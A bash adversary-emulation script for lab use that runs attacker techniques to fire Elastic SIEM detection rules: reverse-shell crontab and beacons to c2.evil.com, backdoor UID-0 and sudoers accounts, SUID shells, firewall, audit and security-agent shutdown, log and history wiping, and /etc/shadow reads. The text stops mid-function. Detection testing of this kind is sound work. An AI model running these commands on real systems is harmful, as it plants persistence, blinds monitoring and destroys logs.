#!/bin/bash
# ============================================================================
#  _     _                        _    ____ _____   ____  _           
# | |   (_)_ __  _   ___  __     / \  |  _ \_   _| / ___|(_)_ __ ___  
# | |   | | '_ \| | | \ \/ /   / _ \ | |_) || |   \___ \| | '_ ` _ \ 
# | |___| | | | | |_| |>  <   / ___ \|  __/ | |    ___) | | | | | | |
# |_____|_|_| |_|\__,_/_/\_\ /_/   \_\_|    |_|   |____/|_|_| |_| |_|
#
# Linux APT Simulator v3.0  —  EXECUTION-FOCUSED
# Every test ACTUALLY EXECUTES behavior that triggers Elastic SIEM rules
# No more "drop script only" — real process events, real syscalls, real alerts
#
# Designed for: Elastic Security + Elastic Defend / Auditbeat / Filebeat
# Mapped to: MITRE ATT&CK + Elastic prebuilt detection rule names
#
# ⚠  FOR LAB/TEST ENVIRONMENTS ONLY
# ============================================================================

set +e

# --- Config ---
APTDIR="/tmp/.apt-sim"
LOGFILE="/tmp/apt-simulator.log"
CLEANUP="/tmp/apt-sim-cleanup.sh"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'
DIM='\033[2m'; NC='\033[0m'
SIM_USER="apt_backdoor"
TC=0; PC=0; FC=0
SPIN_PID=""; CURRENT_TEST=""; INFO_BUF=""
COLS=$(tput cols 2>/dev/null || echo 80)

# --- Animation Engine ---
matrix_rain() {
    local rows="${1:-6}"
    local MCHARS='ｦｧｨｩｪｫｬｭｮｯｰｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉ0123456789ABCDEF!@#$%^&*'
    local MLEN=${#MCHARS}
    local DG='\033[2;32m' BG='\033[1;32m' WG='\033[1;37m'
    tput civis 2>/dev/null
    for ((r=0; r<rows; r++)); do
        local line=""
        for ((c=0; c<COLS/2; c++)); do
            local idx=$((RANDOM % MLEN))
            local ch="${MCHARS:$idx:1}"
            case $((RANDOM % 6)) in
                0) line+="${WG}${ch}\033[0m" ;;
                1) line+="${BG}${ch}\033[0m" ;;
                *) line+="${DG}${ch}\033[0m" ;;
            esac
        done
        printf '%b\n' "$line"
        sleep 0.04
    done
    tput cnorm 2>/dev/null
}

typewrite() {
    local text="$1" delay="${2:-0.018}"
    for ((i=0; i<${#text}; i++)); do
        printf '%s' "${text:$i:1}"
        sleep "$delay"
    done
    printf '\n'
}

spin_start() {
    local msg="$1"
    local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    (
        while true; do
            for f in "${frames[@]}"; do
                printf "\r  \033[0;36m%s\033[0m \033[2m%-65s\033[0m" "$f" "$msg"
                sleep 0.08
            done
        done
    ) &
    SPIN_PID=$!
}

spin_stop() {
    if [[ -n "$SPIN_PID" ]]; then
        kill "$SPIN_PID" 2>/dev/null
        wait "$SPIN_PID" 2>/dev/null
        SPIN_PID=""
        printf "\r\033[2K"
    fi
}

progress_bar() {
    local current="$1" total="$2" width="${3:-44}"
    local filled=0
    [ "$total" -gt 0 ] && filled=$(( current * width / total ))
    local empty=$(( width - filled ))
    local pct=0
    [ "$total" -gt 0 ] && pct=$(( current * 100 / total ))
    local bar=""
    for ((i=0; i<filled; i++)); do bar+="█"; done
    for ((i=0; i<empty; i++)); do bar+="░"; done
    printf "    \033[0;32m%s\033[0m \033[1m%d%%\033[0m" "$bar" "$pct"
}

anim_count() {
    local target="$1" label="$2" color="$3"
    local step=1
    [ "$target" -gt 50 ] && step=$(( target / 30 ))
    [ "$step" -lt 1 ] && step=1
    for ((i=0; i<=target; i+=step)); do
        printf "\r    %b%-8s\033[0m \033[1m%d\033[0m " "$color" "$label" "$i"
        sleep 0.015
    done
    printf "\r    %b%-8s\033[0m \033[1m%d\033[0m\n" "$color" "$label" "$target"
}

# --- Helpers ---
banner() {
    clear
    matrix_rain 7
    sleep 0.2
    clear
    printf '\033[0;31m'
    local ART=(
'  _     _                        _    ____ _____   ____  _           '
' | |   (_)_ __  _   ___  __     / \  |  _ \_   _| / ___|(_)_ __ ___  '
' | |   | | '"'"'_ \| | | \ \/ /   / _ \ | |_) || |   \___ \| | '"'"'_ ` _ \ '
' | |___| | | | | |_| |>  <   / ___ \|  __/ | |    ___) | | | | | | |'
' |_____|_|_| |_|\__,_/_/\_\ /_/   \_\_|    |_|   |____/|_|_| |_| |_|'
    )
    for line in "${ART[@]}"; do
        printf '%s\n' "$line"
        sleep 0.07
    done
    printf '\033[0m\n'
    sleep 0.1
    typewrite "  Linux APT Simulator v3.0 — EXECUTION FOCUSED" 0.013
    typewrite "  Every test fires real process events for Elastic SIEM" 0.009
    printf "  \033[1;33m⚠  FOR LAB/TEST ENVIRONMENTS ONLY\033[0m\n"
    echo ""
    printf "  "; for ((i=0; i<$((COLS-4<58?COLS-4:58)); i++)); do printf '═'; sleep 0.01; done; echo ""
    echo ""
}

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOGFILE"; }

t() {
    TC=$((TC+1))
    INFO_BUF=""
    CURRENT_TEST="$1"
    log "[TEST $TC] $1"
    spin_start "$1"
}

ok() {
    spin_stop
    PC=$((PC+1))
    printf "  \033[0;36m[%d]\033[0m \033[0;32m✓\033[0m \033[1m%s\033[0m\n" "$TC" "$CURRENT_TEST"
    [ -n "$INFO_BUF" ] && printf '%b' "$INFO_BUF"
    printf "      \033[2m→ %s\033[0m\n" "$1"
    INFO_BUF=""
    log "[OK] $1"
}

fail() {
    spin_stop
    FC=$((FC+1))
    printf "  \033[0;36m[%d]\033[0m \033[0;31m✗\033[0m \033[2m%s\033[0m\n" "$TC" "$CURRENT_TEST"
    [ -n "$INFO_BUF" ] && printf '%b' "$INFO_BUF"
    printf "      \033[2m→ %s\033[0m\n" "$1"
    INFO_BUF=""
    log "[FAIL] $1"
}

info() {
    INFO_BUF="${INFO_BUF}      \033[2m[rule] $1\033[0m\n"
    log "[INFO] $1"
}

hdr() {
    echo ""
    printf "  \033[1;35m┌────────────────────────────────────────────────────────────┐\033[0m\n"
    sleep 0.04
    printf "  \033[1;35m│\033[0m \033[1m"
    for ((i=0; i<${#1}; i++)); do
        printf '%s' "${1:$i:1}"
        sleep 0.009
    done
    printf "\033[0m\n"
    sleep 0.04
    printf "  \033[1;35m└────────────────────────────────────────────────────────────┘\033[0m\n\n"
    log "=== $1 ==="
}

cl() { echo "$1" >> "$CLEANUP"; }
check_root() { [ "$EUID" -ne 0 ] && echo -e "${RED}[!] Run as root: sudo bash $0${NC}" && exit 1; }
setup() {
    mkdir -p "$APTDIR"/{loot,tools,staging}
    : > "$LOGFILE"
    echo '#!/bin/bash' > "$CLEANUP"
    echo '# APT Simulator Cleanup — auto-generated' >> "$CLEANUP"
    chmod +x "$CLEANUP"
    log "=== APT Simulator v3.0 started ==="
}

# ============================================================================
# EXECUTION (TA0002) — Elastic rules that fire on process execution
# ============================================================================
test_execution() {
    hdr "EXECUTION (TA0002)"

    # --- Elastic Rule: "Linux Command and Scripting Interpreter" ---
    t "Suspicious Shell Script Execution"
    info "Elastic: Command and Scripting Interpreter: Unix Shell"
    bash -c 'whoami; id; uname -a; cat /etc/passwd 2>/dev/null; ss -tlnp 2>/dev/null' > /dev/null 2>&1
    ok "bash -c executed recon chain (whoami, id, uname, cat /etc/passwd, ss)"

    # --- Elastic Rule: "Shell Execution via Python/Perl/Ruby" ---
    t "Python Spawning Interactive Shell"
    info "Elastic: Linux Binary Spawning Shell"
    if command -v python3 &>/dev/null; then
        python3 -c 'import pty; pty.spawn("/bin/sh")' <<< 'exit' 2>/dev/null
        ok "python3 -c 'import pty; pty.spawn(\"/bin/sh\")' executed"
    else
        fail "python3 not available"
    fi

    t "Perl Spawning Shell"
    if command -v perl &>/dev/null; then
        perl -e 'exec "/bin/sh";' <<< 'exit' 2>/dev/null
        ok "perl -e 'exec \"/bin/sh\"' executed"
    else
        fail "perl not available"
    fi

    # --- Elastic Rule: "Suspicious Execution via SUID/SGID Binary" ---
    t "Find Command Shell Escape (GTFOBin)"
    info "Elastic: Shell Evasion via Linux Binary"
    find . -maxdepth 0 -exec /bin/sh -c 'echo "find_exec_shell"' \; 2>/dev/null
    ok "find -exec /bin/sh -c '...' executed"

    # --- Elastic Rule: "Suspicious curl/wget" ---
    t "Curl Pipe to Bash (Execution Pattern)"
    info "Elastic: Suspicious Curl/Wget Activity"
    echo 'echo "curl_pipe_bash_simulation"' > /tmp/.apt-sim-payload.sh
    curl -s file:///tmp/.apt-sim-payload.sh 2>/dev/null | bash 2>/dev/null
    ok "curl ... | bash pattern executed"
    cl "rm -f /tmp/.apt-sim-payload.sh"

    t "Wget Download to Suspicious Path"
    wget -q -O /dev/shm/.update http://localhost/ 2>/dev/null || touch /dev/shm/.update
    chmod +x /dev/shm/.update 2>/dev/null
    ok "wget -O /dev/shm/.update + chmod +x executed"
    cl "rm -f /dev/shm/.update"

    # --- Elastic Rule: "Base64 Decoded and Executed" ---
    t "Base64 Decode Pipe to Shell"
    info "Elastic: Base64 Encoding/Decoding Activity"
    echo "echo base64_decoded_exec" | base64 | base64 -d | bash 2>/dev/null
    ok "echo '...' | base64 -d | bash executed"

    echo "d2hvYW1p" | base64 -d | bash > /dev/null 2>&1
    ok "base64 -d | bash with encoded 'whoami' executed"

    # --- Elastic Rule: "Execution from /dev/shm" ---
    t "Execution from Shared Memory (/dev/shm)"
    info "Elastic: Suspicious Execution from /dev/shm"
    echo '#!/bin/bash' > /dev/shm/.memexec
    echo 'id; hostname' >> /dev/shm/.memexec
    chmod +x /dev/shm/.memexec
    /dev/shm/.memexec > /dev/null 2>&1
    ok "Script executed from /dev/shm (memory-backed filesystem)"
    cl "rm -f /dev/shm/.memexec"

    # --- Elastic Rule: "Execution from Unusual Directory" ---
    t "Execution from /var/tmp"
    echo '#!/bin/bash' > /var/tmp/.sysupdate
    echo 'whoami' >> /var/tmp/.sysupdate
    chmod +x /var/tmp/.sysupdate
    /var/tmp/.sysupdate > /dev/null 2>&1
    ok "Binary executed from /var/tmp"
    cl "rm -f /var/tmp/.sysupdate"

    # --- Crontab modification (fires multiple rules) ---
    t "Crontab Modification with Suspicious Entry"
    info "Elastic: Suspicious Crontab Creation/Modification"
    CRON_BAK=$(crontab -l 2>/dev/null || true)
    (echo "$CRON_BAK"; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' # APT-SIM") | crontab -
    ok "crontab -l | crontab - with reverse shell entry"
    cl "crontab -l 2>/dev/null | grep -v 'APT-SIM' | crontab - 2>/dev/null"

    t "At Job Scheduling"
    if command -v at &>/dev/null; then
        echo "echo at_job_exec" | at now + 999 minutes 2>/dev/null
        ok "at now + 999 minutes scheduled"
        cl "atq 2>/dev/null | awk '{print \$1}' | xargs -r atrm 2>/dev/null"
    else
        fail "at not installed"
    fi

    # --- Elastic Rule: "Suspicious Systemd Timer" ---
    t "Systemd Timer Creation"
    info "Elastic: Systemd Timer/Service Created"
    cat > /etc/systemd/system/apt-sim-c2.service << 'SVC'
[Unit]
Description=System Telemetry
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -s http://c2.evil.com/beacon || true'
SVC
    cat > /etc/systemd/system/apt-sim-c2.timer << 'TMR'
[Unit]
Description=Telemetry Timer
[Timer]
OnBootSec=2min
OnUnitActiveSec=15min
[Install]
WantedBy=timers.target
TMR
    systemctl daemon-reload 2>/dev/null
    ok "systemd timer + service created and daemon-reloaded"
    cl "rm -f /etc/systemd/system/apt-sim-c2.{service,timer}; systemctl daemon-reload 2>/dev/null"
}

# ============================================================================
# PERSISTENCE (TA0003) — Creating actual persistent artifacts
# ============================================================================
test_persistence() {
    hdr "PERSISTENCE (TA0003)"

    # --- Elastic Rule: "Linux User Account Creation" ---
    t "User Account Creation"
    info "Elastic: User Account Creation"
    useradd -M -s /bin/bash -G root "$SIM_USER" 2>/dev/null
    echo "${SIM_USER}:APTSim2024!" | chpasswd 2>/dev/null
    ok "useradd $SIM_USER with root group membership"
    cl "userdel -rf $SIM_USER 2>/dev/null"

    t "UID 0 Account Creation"
    info "Elastic: User Added to Root/Admin Group"
    useradd -M -s /bin/bash -o -u 0 -g 0 sysbackup 2>/dev/null
    ok "useradd with UID 0 (root-equivalent user)"
    cl "userdel -rf sysbackup 2>/dev/null"

    # --- Elastic Rule: "Authorized Keys Modification" ---
    t "SSH Authorized Keys Modification"
    info "Elastic: SSH Authorized Keys Modification"
    mkdir -p /root/.ssh
    echo "ssh-rsa AAAAB3FAKEKEY_APT_SIM attacker@c2" >> /root/.ssh/authorized_keys
    ok "echo 'ssh-rsa ...' >> /root/.ssh/authorized_keys"
    cl "sed -i '/FAKEKEY_APT_SIM/d' /root/.ssh/authorized_keys 2>/dev/null"

    # --- Elastic Rule: "Systemd Service Created" ---
    t "Systemd Service Creation (Disguised)"
    info "Elastic: New Systemd Service Created by Previously Unknown Process"
    cat > /etc/systemd/system/dbus-org.freedesktop.resolve1.service << 'SVC'
[Unit]
Description=Network Name Resolution
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true;do sleep 300;nslookup c2.evil.com;done'
Restart=always
[Install]
WantedBy=multi-user.target
SVC
    systemctl daemon-reload 2>/dev/null
    ok "Disguised systemd service created + daemon-reload"
    cl "rm -f /etc/systemd/system/dbus-org.freedesktop.resolve1.service; systemctl daemon-reload 2>/dev/null"

    # --- Elastic Rule: "Init.d File Creation" ---
    t "Init Script Creation"
    info "Elastic: Init.d Script Created"
    if [ -d /etc/init.d ]; then
        cat > /etc/init.d/apt-sim-monitor << 'INIT'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          sysmonitor
# Default-Start:     2 3 4 5
### END INIT INFO
curl -s http://c2.evil.com/init || true
INIT
        chmod +x /etc/init.d/apt-sim-monitor
        ok "Created executable init.d script"
        cl "rm -f /etc/init.d/apt-sim-monitor"
    else
        fail "/etc/init.d not found"
    fi

    # --- Elastic Rule: "Shell Profile/Config Modification" ---
    t "Shell Configuration Modification (.bashrc)"
    info "Elastic: Bash Shell Profile Modification"
    cp /root/.bashrc /root/.bashrc.apt-sim-bak 2>/dev/null
    echo '# APT-SIM' >> /root/.bashrc
    echo '(nohup curl -s http://c2.evil.com/login &>/dev/null &) 2>/dev/null' >> /root/.bashrc
    ok "Appended C2 beacon to /root/.bashrc"
    cl "cp /root/.bashrc.apt-sim-bak /root/.bashrc 2>/dev/null; rm -f /root/.bashrc.apt-sim-bak"

    t "Profile.d Script Creation"
    info "Elastic: Profile.d Script Modification"
    cat > /etc/profile.d/apt-sim.sh << 'PROF'
#!/bin/bash
# APT-SIM
curl -s http://c2.evil.com/profile_hook &>/dev/null &
PROF
    chmod +x /etc/profile.d/apt-sim.sh
    ok "Created /etc/profile.d/apt-sim.sh"
    cl "rm -f /etc/profile.d/apt-sim.sh"

    # --- Elastic Rule: "Cron.d File Creation" ---
    t "Cron.d Persistent Entry"
    info "Elastic: Cron Job Created/Modified"
    echo "*/10 * * * * root curl -s http://c2.evil.com/cron || true" > /etc/cron.d/apt-sim
    ok "Created /etc/cron.d/apt-sim"
    cl "rm -f /etc/cron.d/apt-sim"

    # --- Elastic Rule: "LD_PRELOAD/ld.so.preload Modification" ---
    t "LD Preload Hijacking"
    info "Elastic: Shared Object Created or Changed in /etc/ld.so.preload"
    # Write and immediately revert in one shot — Elastic captures the file event
    cp /etc/ld.so.preload /etc/ld.so.preload.apt-sim-bak 2>/dev/null; true
    bash -c 'echo "/tmp/.evil.so" >> /etc/ld.so.preload 2>/dev/null; sed -i "/.evil.so/d" /etc/ld.so.preload 2>/dev/null'
    ok "echo >> /etc/ld.so.preload (written + reverted atomically)"
    cl "sed -i '/.evil.so/d' /etc/ld.so.preload 2>/dev/null; rm -f /etc/ld.so.preload.apt-sim-bak"

    # --- Elastic Rule: "Kernel Module Load via insmod/modprobe" ---
    t "Kernel Module Load Attempt"
    info "Elastic: Kernel Module Load/Removal"
    insmod /tmp/fakekernelmod.ko 2>/dev/null || true
    modprobe fakekernelmod 2>/dev/null || true
    ok "insmod + modprobe executed (expected to fail, still fires rule)"

    # --- Elastic Rule: "Udev Rule Created" ---
    t "Udev Rule Creation"
    info "Elastic: Udev Rule Creation"
    echo 'ACTION=="add", RUN+="/bin/bash -c curl http://c2.evil.com/usb"' > /etc/udev/rules.d/99-apt-sim.rules
    ok "Created /etc/udev/rules.d/99-apt-sim.rules"
    cl "rm -f /etc/udev/rules.d/99-apt-sim.rules"

    # --- Elastic Rule: "MOTD Backdoor" ---
    t "MOTD Script Creation"
    info "Elastic: Suspicious Process Spawned from MOTD"
    if [ -d /etc/update-motd.d ]; then
        echo '#!/bin/bash' > /etc/update-motd.d/99-apt-sim
        echo 'curl -s http://c2.evil.com/motd &>/dev/null &' >> /etc/update-motd.d/99-apt-sim
        chmod +x /etc/update-motd.d/99-apt-sim
        ok "Created MOTD backdoor script"
        cl "rm -f /etc/update-motd.d/99-apt-sim"
    else
        fail "/etc/update-motd.d not found"
    fi

    # --- Elastic Rule: "SSH Config Modification" ---
    t "SSHD Config Modification"
    info "Elastic: SSH Configuration Modification"
    cp /etc/ssh/sshd_config /etc/ssh/sshd_config.apt-sim-bak 2>/dev/null
    sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config 2>/dev/null
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
    ok "Modified sshd_config: PermitRootLogin yes, PasswordAuthentication yes"
    cl "cp /etc/ssh/sshd_config.apt-sim-bak /etc/ssh/sshd_config 2>/dev/null; rm -f /etc/ssh/sshd_config.apt-sim-bak"
}

# ============================================================================
# PRIVILEGE ESCALATION (TA0004)
# ============================================================================
test_privesc() {
    hdr "PRIVILEGE ESCALATION (TA0004)"

    # --- Elastic Rule: "SUID/SGID Bit Set" ---
    t "SUID Bit Set on Binary"
    info "Elastic: SUID/SGID Bit Set"
    cp /bin/bash "$APTDIR/tools/suid_bash"
    chmod u+s "$APTDIR/tools/suid_bash"
    chmod 4755 "$APTDIR/tools/suid_bash"
    ok "chmod u+s / chmod 4755 on bash copy"
    cl "rm -f $APTDIR/tools/suid_bash"

    t "SUID Set on Find (GTFOBin)"
    cp /usr/bin/find "$APTDIR/tools/suid_find" 2>/dev/null
    chmod u+s "$APTDIR/tools/suid_find" 2>/dev/null
    ok "chmod u+s on find binary copy"
    cl "rm -f $APTDIR/tools/suid_find"

    # --- Elastic Rule: "Sudoers File Modification" ---
    t "Sudoers Modification"
    info "Elastic: Sudoers File Modification"
    echo "# APT-SIM" >> /etc/sudoers
    echo "$SIM_USER ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
    ok "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
    cl "sed -i '/APT-SIM/d' /etc/sudoers; sed -i '/${SIM_USER}.*NOPASSWD/d' /etc/sudoers"

    if [ -d /etc/sudoers.d ]; then
        echo "$SIM_USER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/apt-sim
        chmod 440 /etc/sudoers.d/apt-sim
        ok "Created /etc/sudoers.d/apt-sim"
        cl "rm -f /etc/sudoers.d/apt-sim"
    fi

    # --- Elastic Rule: "Capabilities Set on Binary" ---
    t "File Capabilities Modification (setcap)"
    info "Elastic: Setcap/Setuid Set on File"
    if command -v setcap &>/dev/null; then
        cp /usr/bin/python3 "$APTDIR/tools/cap_python" 2>/dev/null
        setcap cap_setuid+ep "$APTDIR/tools/cap_python" 2>/dev/null
        ok "setcap cap_setuid+ep on python3 copy"
        cl "rm -f $APTDIR/tools/cap_python"
    else
        fail "setcap not available"
    fi

    # --- SUID Binary Enumeration ---
    t "SUID/SGID Binary Enumeration"
    info "Elastic: Enumeration of SUID Executables"
    find / -perm -4000 -type f -ls 2>/dev/null > "$APTDIR/loot/suid_bins.txt"
    find / -perm -2000 -type f -ls 2>/dev/null >> "$APTDIR/loot/suid_bins.txt"
    ok "find / -perm -4000 executed (SUID enum)"
    cl "rm -f $APTDIR/loot/suid_bins.txt"

    # --- Elastic Rule: "Suspicious chmod on File in /tmp" ---
    t "Suspicious Chmod in /tmp and /dev/shm"
    info "Elastic: File Made Executable in Suspicious Directory"
    touch /tmp/.apt-sim-payload
    chmod 755 /tmp/.apt-sim-payload
    chmod +x /dev/shm/.memexec 2>/dev/null || true
    touch /var/tmp/.backdoor
    chmod 777 /var/tmp/.backdoor
    ok "chmod 755/777/+x on files in /tmp, /dev/shm, /var/tmp"
    cl "rm -f /tmp/.apt-sim-payload /var/tmp/.backdoor"

    # --- Elastic Rule: "Kernel Parameter Modification" ---
    t "Kernel Parameter Modification via sysctl/proc"
    info "Elastic: Suspicious Kernel Parameter Activity"
    sysctl -w kernel.randomize_va_space=0 2>/dev/null || echo 0 > /proc/sys/kernel/randomize_va_space 2>/dev/null
    sysctl -w kernel.yama.ptrace_scope=0 2>/dev/null || echo 0 > /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
    sysctl -w net.ipv4.ip_forward=1 2>/dev/null || echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    ok "sysctl -w kernel.randomize_va_space=0, ptrace_scope=0, ip_forward=1"
    cl "sysctl -w kernel.randomize_va_space=2 2>/dev/null"
    cl "sysctl -w kernel.yama.ptrace_scope=1 2>/dev/null"
    cl "sysctl -w net.ipv4.ip_forward=0 2>/dev/null"
}

# ============================================================================
# DEFENSE EVASION (TA0005) — Execute actual evasion behaviors
# ============================================================================
test_defense_evasion() {
    hdr "DEFENSE EVASION (TA0005)"

    # --- Elastic Rule: "Attempt to Disable IPTables/Firewall" ---
    t "Firewall Disable — iptables flush"
    info "Elastic: Attempt to Disable IPTables or Firewall"
    iptables -F 2>/dev/null
    iptables -X 2>/dev/null
    ok "iptables -F; iptables -X executed"
    cl "# Note: firewall rules were flushed, re-apply manually if needed"

    t "Firewall Disable — ufw"
    ufw disable 2>/dev/null || true
    ok "ufw disable executed"

    t "Firewall Disable — nftables"
    nft flush ruleset 2>/dev/null || true
    ok "nft flush ruleset executed"

    # --- Elastic Rule: "Attempt to Disable Syslog" ---
    t "Syslog Service Stop Attempt"
    info "Elastic: Attempt to Disable Syslog Service"
    systemctl stop rsyslog 2>/dev/null || true
    service rsyslog stop 2>/dev/null || true
    systemctl stop syslog 2>/dev/null || true
    ok "systemctl stop rsyslog/syslog executed"
    cl "systemctl start rsyslog 2>/dev/null"

    # --- Elastic Rule: "Attempt to Disable Auditd" ---
    t "Auditd Service Stop Attempt"
    info "Elastic: Attempt to Disable Auditd"
    systemctl stop auditd 2>/dev/null || true
    service auditd stop 2>/dev/null || true
    ok "systemctl stop auditd executed"
    cl "systemctl start auditd 2>/dev/null"

    # --- Elastic Rule: "Tampering of Bash Command-Line History" ---
    t "Bash History Tampering"
    info "Elastic: Tampering of Bash Command-Line History"
    export HISTSIZE=0
    export HISTFILESIZE=0
    unset HISTFILE
    ln -sf /dev/null /root/.bash_history 2>/dev/null
    history -c 2>/dev/null
    ok "HISTSIZE=0, unset HISTFILE, history -c, symlink to /dev/null"
    cl "unset HISTSIZE HISTFILESIZE; rm -f /root/.bash_history; touch /root/.bash_history"

    # --- Elastic Rule: "Timestomping" ---
    t "File Timestomping via touch"
    info "Elastic: Timestomping using Touch"
    touch "$APTDIR/tools/backdoor_binary" 2>/dev/null
    touch -t 201801010000.00 "$APTDIR/tools/backdoor_binary"
    touch -r /bin/ls "$APTDIR/tools/backdoor_binary" 2>/dev/null
    ok "touch -t 201801010000.00 (timestomped to 2018)"

    # --- Elastic Rule: "File Deletion via Shred" ---
    t "Secure File Deletion (shred)"
    info "Elastic: Suspicious File Deletion via Shred"
    echo "sensitive_malware_data" > /tmp/.apt-sim-evidence
    shred -vfzu -n 3 /tmp/.apt-sim-evidence 2>/dev/null
    ok "shred -vfzu -n 3 on file"

    # --- Elastic Rule: "Log File Deletion/Truncation" ---
    t "System Log Truncation"
    info "Elastic: System Log File Deletion/Truncation"
    touch /var/log/apt-sim-test.log
    echo "test_log_entry" > /var/log/apt-sim-test.log
    > /var/log/apt-sim-test.log
    rm -f /var/log/apt-sim-test.log
    ok "Truncated and deleted log file"

    t "Journal Vacuum"
    info "Elastic: Journal Log Cleared"
    journalctl --vacuum-time=1s 2>/dev/null || true
    ok "journalctl --vacuum-time=1s executed"

    t "Wtmp/Btmp Manipulation"
    info "Elastic: Wtmp/Btmp Log Cleared"
    cp /var/log/wtmp /var/log/wtmp.apt-sim-bak 2>/dev/null
    > /var/log/wtmp 2>/dev/null
    utmpdump /var/log/wtmp 2>/dev/null || true
    ok "Truncated /var/log/wtmp"
    cl "cp /var/log/wtmp.apt-sim-bak /var/log/wtmp 2>/dev/null; rm -f /var/log/wtmp.apt-sim-bak"

    # --- Elastic Rule: "Hidden File/Directory Creation" ---
    t "Hidden File and Directory Creation"
    info "Elastic: Creation of Hidden Files/Directories"
    mkdir -p /tmp/.../ 2>/dev/null
    touch /tmp/.hidden_payload
    mkdir -p "/tmp/   " 2>/dev/null
    mkdir -p /var/tmp/.cache/.nested/.deep 2>/dev/null
    ok "Created hidden dirs: /tmp/.../, /tmp/'   '/, /var/tmp/.cache/.nested/"
    cl "rm -rf '/tmp/.../' /tmp/.hidden_payload '/tmp/   ' /var/tmp/.cache/.nested"

    # --- Elastic Rule: "Masquerading as System Binary" ---
    t "Process Masquerading"
    info "Elastic: Masquerading as Linux System Binary"
    cp /bin/true /var/tmp/sshd 2>/dev/null && /var/tmp/sshd 2>/dev/null
    cp /bin/true /dev/shm/kworker 2>/dev/null && /dev/shm/kworker 2>/dev/null
    cp /bin/true /tmp/systemd-logind 2>/dev/null && /tmp/systemd-logind 2>/dev/null
    ok "Executed masqueraded binaries from /var/tmp, /dev/shm, /tmp"
    cl "rm -f /var/tmp/sshd /dev/shm/kworker /tmp/systemd-logind"

    # --- Elastic Rule: "Rename System Utility" ---
    t "System Utility Renamed and Executed"
    info "Elastic: Renamed System Utility Execution"
    cp /usr/bin/curl /tmp/.update-checker 2>/dev/null
    /tmp/.update-checker --version > /dev/null 2>&1 || true
    cp /usr/bin/wget /tmp/.sysmon 2>/dev/null
    /tmp/.sysmon --version > /dev/null 2>&1 || true
    ok "curl renamed to .update-checker and executed"
    cl "rm -f /tmp/.update-checker /tmp/.sysmon"

    # --- Elastic Rule: "Potential Security Tool Disable" ---
    # --- Elastic Rule: "File made Immutable via chattr" ---
    t "File Made Immutable (chattr)"
    info "Elastic: File Made Immutable"
    touch /tmp/.apt-sim-immutable
    chattr +i /tmp/.apt-sim-immutable 2>/dev/null || true
    ok "chattr +i on /tmp/.apt-sim-immutable"
    cl "chattr -i /tmp/.apt-sim-immutable 2>/dev/null; rm -f /tmp/.apt-sim-immutable"
}

# ============================================================================
# CREDENTIAL ACCESS (TA0006) — Actually read credential files
# ============================================================================
# ============================================================================
# SECURITY TOOL DISABLE (STANDALONE — NOT IN RUN ALL / --auto)
# ⚠  This WILL stop your monitoring agents (elastic-agent, filebeat, etc.)
#    Only accessible via explicit menu [D]. Excluded from run_all() on purpose.
# ============================================================================
test_disable_security_tools() {
    hdr "SECURITY TOOL DISABLE (STANDALONE)"

    echo -e "  ${YELLOW}${BOLD}⚠  WARNING${NC}${YELLOW}: This will stop elastic-agent, filebeat, wazuh-agent,${NC}"
    echo -e "  ${YELLOW}falco, and ossec on this host.${NC}"
    echo -e "  ${YELLOW}Cleanup script only restarts elastic-agent + filebeat automatically.${NC}"
    echo ""
    echo -n "  Type 'yes' to continue: "
    read -r CONFIRM
    if [ "$CONFIRM" != "yes" ]; then
        echo -e "  ${DIM}Aborted.${NC}"
        return
    fi
    echo ""

    t "Security Tool Disable Attempt"
    info "Elastic: Attempt to Disable Security Tools"
    systemctl stop elastic-agent 2>/dev/null || true
    systemctl stop filebeat 2>/dev/null || true
    systemctl stop wazuh-agent 2>/dev/null || true
    systemctl stop falco 2>/dev/null || true
    service ossec stop 2>/dev/null || true
    ok "systemctl stop elastic-agent/filebeat/wazuh-agent/falco/ossec"
    cl "systemctl start elastic-agent 2>/dev/null; systemctl start filebeat 2>/dev/null; systemctl start wazuh-agent 2>/dev/null; systemctl start falco 2>/dev/null; service ossec start 2>/dev/null"

    echo ""
    echo -e "  ${CYAN}Restore now:${NC} ${BOLD}sudo systemctl start elastic-agent filebeat wazuh-agent falco${NC}"
    echo ""
}

test_credential_access() {
    hdr "CREDENTIAL ACCESS (TA0006)"

    # --- Elastic Rule: "Sensitive File Access" ---
    t "Shadow File Read"
    info "Elastic: Sensitive File Access — /etc/shadow"
    cat /etc/shadow > /dev/null 2>&1
    ok "cat /etc/shadow executed"

    t "Passwd/Group File Read"
    cat /etc/passwd > /dev/null 2>&1
    cat /etc/group > /dev/null 2>&1
    cat /etc/gshadow > /dev/null 2>&1
    ok "cat /etc/passwd, /etc/group, /etc/gshadow executed"

    # --- Elastic Rule: "Credential Dumping via /proc" ---
    t "Credential Dumping via /proc"
    info "Elastic: Access to /proc Credentials"
    cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|key|secret|token' > /dev/null 2>&1
    for pid in $(ls /proc/ | grep -E '^[0-9]+$' | head -10); do
        cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' > /dev/null 2>&1
        cat /proc/$pid/cmdline 2>/dev/null > /dev/null 2>&1
        cat /proc/$pid/maps 2>/dev/null > /dev/null 2>&1
    done
    ok "cat /proc/*/environ, cmdline, maps executed"

    # --- Elastic Rule: "Credential File Search" ---
    t "Credential File Discovery (find)"
    info "Elastic: Sensitive File Search"
